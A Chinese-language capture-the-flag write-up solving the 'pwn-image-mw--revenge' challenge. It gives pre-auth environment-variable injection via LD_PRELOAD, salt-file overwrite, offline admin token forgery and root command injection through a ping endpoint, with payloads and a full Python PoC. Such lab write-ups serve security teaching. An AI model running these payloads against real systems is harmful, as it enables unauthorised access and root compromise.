# pwn-image-mw--revenge WP

## 题目结论

这题我走的是 `mw_token_salt` 这条链，不是另一条“纯靠 C++ 细节硬拧”的思路。

最终 flag：

```text
polarisctf{61bc259b-0e4e-4bb5-98a7-9814bc3afe31}
```

核心利用链只有四步：

1. `MW.API.Auth.login` 里存在 `CVE-2024-10441` 风格的插件 SDK 环境变量注入，而且是 pre-auth。
2. 用 `LD_PRELOAD=/usr/lib/x86_64-linux-gnu/libmemusage.so` 精确覆写 `/usr/mw/etc/mw_token_salt`。
3. `mwtoken.so` 在坏掉的 salt 文件上退化成空 salt，于是可以离线伪造 `admin` 的 `mw-token`。
4. 用伪造 token 调 `MW.API.Network.Ping.run`，打 `target` 参数里的命令注入，最终读出 `/flag.txt`。

---

## 一、先判断 revenge 和上一题是不是同一个镜像

这一题最先该做的不是找新洞，而是先判断附件是否真的变了。

我先对比了 `pwn-image-mw--revenge/manifest.json` 和上一题 `pwn-image-mw/manifest.json`，结果它们是完全一样的，同一套 layer、同一个 config digest。

这意味着一个很重要的结论：

```text
revenge 不是换了一套镜像，而是同一套服务换了题目包装和提示。
```

所以分析顺序不需要推倒重来，应该沿用上一题那条最短主线，只是要确认远端实例仍然能按这条链打通。

这也解释了“二选一”的含义：

- 你可以继续硬挖另一条思路。
- 也可以先验证镜像是否相同，直接走已经成立的 `mw_token_salt` 链。

我选的是后者，因为这是更稳定也更短的利用路径。

---

## 二、先看哪里

如果从零开始看，我建议按下面这个顺序分析：

1. 先看 `start.sh`
2. 再看 `etc/supervisor/conf.d/mw.conf`
3. 再看 `usr/mw/webman/webapi/*.lib`
4. 然后回到 `MW.API.Auth.login` 的调用链
5. 再看 `mw_plugind`
6. 再看 `mwtoken.so`
7. 最后看 `MW.API.Network.Ping.so`

这样看下来，主线会非常清楚，不容易被 `passwd.conf` 之类的烟雾弹带偏。

---

## 三、第一步：从启动脚本确认 flag 在哪

先看 `start.sh`：

```bash
#!/bin/bash
set -e

if [ -z "$FLAG" ]; then
    echo "[ERROR] FLAG environment variable is not set!"
    exit 1
fi

echo -n "$FLAG" > /flag.txt
chmod 600 /flag.txt
exec /usr/bin/supervisord -n
```

这里已经把最后目标说死了：

```text
flag 在容器启动时由环境变量 FLAG 动态写入 /flag.txt
```

所以这题最后不需要猜路径，不需要翻镜像历史，也不需要找隐藏配置，最终目标文件就是：

```text
/flag.txt
```

---

## 四、第二步：从 supervisor 配置确认服务结构

再看 `etc/supervisor/conf.d/mw.conf`：

```ini
[program:mw_plugind]
command=/usr/mw/bin/mw_plugind

[program:mwcgi]
command=/usr/mw/bin/mwcgi

[program:nginx]
command=/usr/sbin/nginx -g "daemon off;"

[program:cron]
command=/usr/local/bin/start-crond.sh
```

这里能得到两个关键点：

### 1. HTTP 主链

```text
nginx -> mwcgi -> entry.cgi -> 各个 API .so
```

### 2. 插件守护进程

```text
mw_plugind
```

这个守护进程就是 `CVE-2024-10441` 那条环境变量注入链的真正落点。

---

## 五、第三步：先看 `.lib`，不要先黑盒猜接口

这题路由都在 `usr/mw/webman/webapi/*.lib` 里。

### 1. `MW.API.Auth.lib`

它至少暴露了这些接口：

- `MW.API.Auth.login`
- `MW.API.Auth.logout`
- `MW.API.Auth.Key.get`
- `MW.API.Auth.Type.get`

其中最重要的是：

- `MW.API.Auth.login` 是未授权入口
- `MW.API.Auth.Key.get` 需要 token

### 2. `MW.API.Network.Ping.lib`

只暴露一个接口：

- `MW.API.Network.Ping.run`

并且它要求 `authLevel = 1`，也就是必须带有效 token。

所以只看路由就能得出整体方向：

```text
先从 Auth.login 进去
再想办法拿到有效 token
然后打 Ping.run
```

---

## 六、第四步：真正的漏洞入口在 `Auth.login`，不是密码校验

这一步是整题最重要的理解点。

虽然 revenge 附件没有直接给源码层，但上一题的旧镜像里残留了同一套 `build/src`，结合新版二进制和远端行为可以确认逻辑一致。

`MW.API.Auth.login` 的核心顺序是：

```cpp
SDKPluginWebloginPre(account, passwd, false);
bool auth_success = verify_password(account, passwd);
SDKPluginWebloginPost(...);
```

也就是说：

```text
先走 pre-login 插件
后校验密码
```

这意味着：

- 即使密码错误，插件链也已经执行了
- 所以这条链天然是 pre-auth
- 题目提示“不要爆破密码”，本质上就是在提醒你这里根本不需要登录成功

### 1. `SDKPluginWebloginPre()` 只做长度检查

它对 `account` 和 `passwd` 的检查很弱，实质上只有：

```cpp
if (passwd.length() >= 0x1001 || account.length() >= 0x1001) return;
```

然后就把参数交给插件 SDK：

```cpp
SLIBPluginSetArg(handle, "USER", account.c_str());
SLIBPluginSetArg(handle, "TYPE", passwd.c_str());
SLIBPluginAction(4, handle);
```

这里的核心问题是：

```text
account 没有做换行过滤
```

这就是后面环境变量注入的入口。

---

## 七、漏洞点一：插件 SDK 环境变量注入

### 1. 老源码告诉我们洞是怎么形成的

旧镜像里的 `SLIBPluginAction()` 会把插件参数写入一个 env 文件，再通过 Unix socket 通知 `mw_plugind` 去读取。

而 `mw_plugind` 读 env 文件后，会把内容逐条 `setenv()` 到插件进程环境里。

所以只要攻击者能把自己的内容混进 env 文件，就能把任意环境变量喂给插件脚本。

### 2. 老题和 revenge 这版最容易踩的坑

旧源码写的是 base64 格式：

```text
base64(key):base64(value)
```

但 revenge 这版真正的 `mw_plugind` 二进制实测后发现，它接受的是：

```text
原始 KEY:VALUE
```

我本地直接把新版 `mw_plugind` 跑起来，手工喂一个 env 文件：

```text
USER:foo
TYPE:prelogin
LD_PRELOAD:/usr/lib/x86_64-linux-gnu/libmemusage.so
MEMUSAGE_OUTPUT:/usr/mw/etc/mw_token_salt
```

然后日志里能看到：

```text
Args=[USER=foo,TYPE=prelogin,LD_PRELOAD=/usr/lib/x86_64-linux-gnu/libmemusage.so,MEMUSAGE_OUTPUT=/usr/mw/etc/mw_token_salt]
```

这一步非常关键，因为如果你照旧版 base64 格式打，远端会一直不对。

### 3. 最终注入 payload

所以，revenge 正确的 pre-auth payload 是：

```text
seed
PLUGIN_VALUE_END
LD_PRELOAD:/usr/lib/x86_64-linux-gnu/libmemusage.so
MEMUSAGE_OUTPUT:/usr/mw/etc/mw_token_salt
```

作为 `account` 传给：

```text
/webapi/entry.cgi?api=MW.API.Auth&method=login&version=7
```

哪怕返回的是：

```json
{"error":{"code":401,"message":"Invalid credentials"},"success":false}
```

也没关系，因为插件已经先执行了。

---

## 八、为什么我选 `mw_token_salt` 这条

这就是题目里“二选一”我选的那条。

我没有去赌别的奇技淫巧，而是直接打：

```text
/usr/mw/etc/mw_token_salt
```

原因很简单：

### 1. `libmemusage.so` 给了一个非常稳的能力

通过：

```text
LD_PRELOAD=/usr/lib/x86_64-linux-gnu/libmemusage.so
MEMUSAGE_OUTPUT=<任意绝对路径>
```

可以稳定得到：

```text
按指定绝对路径写文件
```

这比那些会自动加 `.pid` 后缀的 loader writer 强太多。

### 2. `mwtoken.so` 明确把 token 签名绑在 `mw_token_salt` 上

新版镜像里的 `usr/lib/mwtoken.so` 没源码，但动态符号和字符串足够直白：

动态符号里有：

- `mw::issue_mw_token`
- `mw::validate_mw_token`
- `mw::get_or_create_token_salt`

字符串里有：

- `/mw_token_salt`
- `Malformed mw-token`
- `Invalid token expiry`
- `mw-token expired`
- `Invalid mw-token signature`

这就已经把主线指得很清楚了：

```text
想拿 token，就去盯 mw_token_salt
```

所以我的选择是：

```text
环境变量注入 -> 覆写 mw_token_salt -> 伪造 token
```

---

## 九、漏洞点二：把 `mw_token_salt` 打坏，离线伪造 token

### 1. token 结构是什么

我本地写了一个最小 harness 直接调用 `mwtoken.so` 的 `issue_mw_token()` 和 `validate_mw_token()`。

正常 issue 出来的 token 长这样：

```text
YWRtaW4.1774832122.JDYkOTYzY2Y2N2I1NGVjYzJlMCQ0VEIv...
```

拆开以后就是：

```text
base64url(username) . expiry . base64url(signature)
```

其中 `signature` 解码后可以看出是：

```text
$6$<salt>$<sha512-crypt结果>
```

所以它本质上等于：

```python
crypt.crypt(f"{username}|{expiry}", f"$6${salt}$")
```

### 2. 为什么覆写后会退化成空 salt

我本地用系统自带的 `libmemusage.so` 去覆盖 `mw_token_salt`，生成的 blob 前 16 字节全是 `\\x00`。

然后再调用 `issue_mw_token("admin")`，解出来的签名恰好等于：

```python
crypt.crypt(f"admin|{expiry}", "$6$$")
```

也就是：

```text
salt 退化成空字符串
```

这一步就把原本只有服务器知道的 salt，变成了攻击者本地完全可计算的常量。

### 3. forge token 的脚本

因此伪造管理员 token 非常简单：

```python
import base64
import crypt
import time

user = "admin"
exp = str(int(time.time()) + 86400 * 7)
sig = crypt.crypt(f"{user}|{exp}", "$6$$")

token = ".".join([
    base64.urlsafe_b64encode(user.encode()).decode().rstrip("="),
    exp,
    base64.urlsafe_b64encode(sig.encode()).decode().rstrip("="),
])

print(token)
```

### 4. 远端验证 token 是否成功

拿这个 token 请求：

```text
/webapi/entry.cgi?api=MW.API.Auth.Key&method=get&version=1&mw_token=<token>
```

远端返回：

```json
{"data":{"expires_at":...,"token":"...","username":"admin"},"success":true}
```

说明 forge 成功。

---

## 十、拿到 token 后，`Ping` 就是 root RCE

### 1. 为什么盯 `MW.API.Network.Ping.so`

因为它是已经在 `.lib` 里暴露出来的 auth-only 接口。

而且二进制字符串已经把危险点写得很明白：

- `Invalid ping target`
- `/usr/bin/ping -c 1 -W 1 `
- `executing system command=%s`

所以可以判断它大概率是：

```text
拼 shell 命令后直接 system()
```

### 2. 远端怎么确认命令注入

伪造完 token 后，先打一条最小 payload：

```text
target=127.0.0.1$(touch$IFS/usr/mw/webman/rce_ok)
```

只要 web 根里能看到 `/rce_ok`，就说明：

```text
$() 命令替换可用，命令注入成立
```

后面我还实际打过：

```text
target=127.0.0.1$(cp$IFS/etc/passwd$IFS/usr/mw/webman/p)
```

然后直接访问 `/p`，可以读到 `/etc/passwd`，说明这不是“疑似命令注入”，而是稳定可用的文件读。

### 3. 为什么确认权限是 root

我还把 `/proc/self/status` 拷出来看过，里面明确是：

```text
Uid:    0   0   0   0
```

所以 `Ping.run` 这条命令执行面就是 root。

---

## 十一、最后一步：把 `/flag.txt` 外带出来

### 1. 先确认 `/flag.txt` 在根目录

虽然 `start.sh` 已经说明 flag 在 `/flag.txt`，但我还是先用一条很稳的 stdout-to-file 技巧确认根目录内容。

payload：

```text
target=127.0.0.1$(/usr/bin/script$IFS-q$IFS-c$IFS/bin/ls$IFS/usr/mw/webman/lsroot_revenge)
```

这里的思路是：

- 用 `script -q -c /bin/ls <outfile>` 把 `/bin/ls` 的输出写到 web 根文件
- 然后直接访问 `/lsroot_revenge`

这样就能看到 `/` 下确实有：

```text
flag.txt
```

### 2. 为什么不用 `cp /flag.txt`

这版实例里，直接：

```text
cp /flag.txt /usr/mw/webman/xxx
```

有时返回码是 0，但目标文件不稳定出现。

所以我最后用的是更稳的“文件名外带”。

### 3. 文件名外带法

先执行：

```text
target=127.0.0.1$(touch$IFS/FLAGMARK$(cat$IFS/flag.txt))
```

如果 `cat /flag.txt` 成功，就会在 `/` 下创建一个文件名为：

```text
FLAGMARK<flag内容>
```

的文件。

然后再执行一次：

```text
target=127.0.0.1$(/usr/bin/script$IFS-q$IFS-c$IFS/bin/ls$IFS/usr/mw/webman/lsroot_revenge)
```

读 `/lsroot_revenge`，就会直接看到：

```text
FLAGMARKpolarisctf{61bc259b-0e4e-4bb5-98a7-9814bc3afe31}
```

这样就把 flag 拿到了。

---

## 十二、完整打通步骤

下面给完整步骤。

### Step 1. pre-auth 覆写 `mw_token_salt`

请求：

```text
GET /webapi/entry.cgi?api=MW.API.Auth&method=login&version=7
```

其中 `account` 参数为：

```text
seed
PLUGIN_VALUE_END
LD_PRELOAD:/usr/lib/x86_64-linux-gnu/libmemusage.so
MEMUSAGE_OUTPUT:/usr/mw/etc/mw_token_salt
```

`passwd` 随便给错的就行。

返回 `401 Invalid credentials` 并不影响利用。

### Step 2. forge `admin` 的 `mw-token`

```python
import base64
import crypt
import time

exp = str(int(time.time()) + 86400 * 7)
sig = crypt.crypt(f"admin|{exp}", "$6$$")

tok = ".".join([
    base64.urlsafe_b64encode(b"admin").decode().rstrip("="),
    exp,
    base64.urlsafe_b64encode(sig.encode()).decode().rstrip("="),
])
```

### Step 3. 验证 token

请求：

```text
/webapi/entry.cgi?api=MW.API.Auth.Key&method=get&version=1&mw_token=<tok>
```

返回里只要有：

```json
"username":"admin"
```

就说明 token 伪造成功。

### Step 4. 用 `Ping` 执行命令

先打一个最小测试：

```text
target=127.0.0.1$(touch$IFS/usr/mw/webman/poc)
```

能看到 `/poc` 就说明命令注入成立。

### Step 5. 外带 flag

先种文件名：

```text
target=127.0.0.1$(touch$IFS/FLAGMARK$(cat$IFS/flag.txt))
```

再写目录列表：

```text
target=127.0.0.1$(/usr/bin/script$IFS-q$IFS-c$IFS/bin/ls$IFS/usr/mw/webman/lsroot_revenge)
```

最后访问：

```text
/lsroot_revenge
```

用正则提取：

```python
re.findall(r"polarisctf\\{[^}\\n]+\\}", text)[0]
```

得到最终 flag：

```text
polarisctf{61bc259b-0e4e-4bb5-98a7-9814bc3afe31}
```

---

## 十三、最小 PoC

```python
import requests, time, base64, crypt, re

base = "http://1314-6ef0f769-d6ef-4586-8280-6532a9a28480.challenge.ctfplus.cn"

def forge(user="admin"):
    exp = str(int(time.time()) + 86400 * 7)
    sig = crypt.crypt(f"{user}|{exp}", "$6$$")
    return ".".join([
        base64.urlsafe_b64encode(user.encode()).decode().rstrip("="),
        exp,
        base64.urlsafe_b64encode(sig.encode()).decode().rstrip("="),
    ])

# 1. pre-auth salt clobber
payload = (
    "seedR\\n"
    "PLUGIN_VALUE_END\\n"
    "LD_PRELOAD:/usr/lib/x86_64-linux-gnu/libmemusage.so\\n"
    "MEMUSAGE_OUTPUT:/usr/mw/etc/mw_token_salt"
)

requests.get(
    base + "/webapi/entry.cgi",
    params={
        "api": "MW.API.Auth",
        "method": "login",
        "version": "7",
        "account": payload,
        "passwd": "x",
    },
    timeout=20,
)

time.sleep(1)

# 2. forge token
tok = forge("admin")

# 3. exfil flag via filename
for inj in [
    "127.0.0.1$(touch$IFS/FLAGMARK$(cat$IFS/flag.txt))",
    "127.0.0.1$(/usr/bin/script$IFS-q$IFS-c$IFS/bin/ls$IFS/usr/mw/webman/lsroot_revenge)",
]:
    requests.get(
        base + "/webapi/entry.cgi",
        params={
            "api": "MW.API.Network.Ping",
            "method": "run",
            "version": "1",
            "mw_token": tok,
            "target": inj,
        },
        timeout=25,
    )
    time.sleep(1)

text = requests.get(base + "/lsroot_revenge", timeout=20).text
print(re.findall(r"polarisctf\\{[^}\\n]+\\}", text)[0])
```

---

## 十四、这题真正的“二选一”

题目提示是：

```text
fucking cpp！
二选一
```

我这里的答案很明确：

```text
我选的是 mw_token_salt 这条。
```

不是因为另一条一定不存在，而是因为：

1. revenge 和上一题镜像相同
2. `mwtoken.so` 的导出和字符串已经把利用面暴露得很明显
3. 这条链是最短、最稳、可重复性最高的
4. 远端可以直接一把打通

所以这题的最优解在我看来不是继续猜另一个“C++ 味更重”的支线，而是先识别：

```text
镜像没变，主线也没变
```

然后直接复用已经成立的完整利用链。

---

## 十五、总结

这题最顺的分析顺序就是：

1. 用 `start.sh` 确认 flag 在 `/flag.txt`
2. 用 `mw.conf` 确认 `nginx -> mwcgi -> entry.cgi` 和 `mw_plugind`
3. 用 `.lib` 确认两个关键接口：`Auth.login` 和 `Network.Ping.run`
4. 从 `Auth.login` 看出 pre-login 插件在密码校验之前执行
5. 用插件 SDK 环境变量注入拿到 `LD_PRELOAD`
6. 用 `libmemusage.so` 精确覆写 `/usr/mw/etc/mw_token_salt`
7. 逆出 `mw-token` 结构并离线 forge `admin` token
8. 用 `Ping.run` 的命令注入拿 root RCE
9. 读取 `/flag.txt`

整条利用链可以概括成：

```text
pre-auth env injection
-> exact file write
-> token forgery
-> authenticated command injection
-> root file read
```

这也是为什么我说，这题我选的是：

```text
mw_token_salt 这条
```

因为它不是玄学，而是一条证据非常完整、远端可稳定复现的链。
